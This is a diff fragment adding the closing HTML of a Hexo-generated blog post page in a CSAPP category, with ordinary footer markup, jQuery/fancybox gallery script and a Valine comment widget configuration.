+
+
+
+
+
+
+
+
+
+
+
+
+
+                </div>
+            </div>
+            
+                 
+            
+            
+                <div class="post-meta post-footer__meta">
+    <p>
+        最后更新于：2019-06-28
+    </p>
+</div> 
+            
+            
+                <div class="post-cats post-card__cats">
+    
+        <a href="/categories/CSAPP/" class="post-cats__link button">CSAPP</a>
+    
+    
+        <a href="/tags/CSAPP/" class="post-tags__link button"># CSAPP</a>
+    
+</div> 
+             
+        </article>
+        
+            <div class="post__comments content-card">
+                
+    <h4 style="margin-top: 0;">评论</h4>
+    
+    
+        <div id="valine_container" class="valine_thread"></div>
+    
+    
+    
+    
+    
+    
+    
+
+
+            </div>
+        
+    </div>
+
+
+</main>
+<footer class="footer">
+     
+
+
+     
+  
+    
+        
+            <p>⌨️ with ❤️ by name1e5s</p>
+
+        
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+
+        </div>
+        
+
+ 
+
+ 
+
+ 
+
+  
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+<script>
+    let lazyloadT = Boolean(''),
+        auto_fancybox = Boolean('true')
+    if (auto_fancybox) {
+        $(".post__content").find('img').each(function () {
+            var element = document.createElement("a");
+            $(element).attr("data-fancybox", "gallery");
+            $(element).attr("href", $(this).attr("src"));
+            if (lazyloadT) {
+                $(element).attr("href", $(this).attr("data-srcset"));
+            }
+            $(this).wrap(element);
+        });
+    } else {
+        $(".post__content").find("fancybox").find('img').each(function () {
+            var element = document.createElement("a");
+            $(element).attr("data-fancybox", "gallery");
+            $(element).attr("href", $(this).attr("src"));
+            if (lazyloadT) {
+                $(element).attr("href", $(this).attr("data-srcset"));
+            }
+            $(this).wrap(element);
+        });
+    }
+</script>
+ 
+ 
+
+ 
+    
+<script src="/js/b2t.js"></script>
+
+
+
+
+
+
+    
+    
+    
+        
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+
+        <script>
+            var valineConfig = {"enable":true,"appId":"eGiyDKdVDXYyroLSQ2l1kWQo-gzGzoHsz","appKey":"OUCC7PiGGX7dXQ6VQfXPiJeM","placeholder":null,"path":null,"avatar":null,"meta":["nick","mail","link"],"pageSize":null,"lang":null,"visitor":null,"highlight":null,"avatarForce":null,"recordIP":null,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+            valineConfig.el = '#valine_container';
+            for (var i in valineConfig) {
+                if (valineConfig[i] === null) delete valineConfig[i];
+            }
+            new Valine(valineConfig);
+        </script>
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+
+    </body>
+</html>
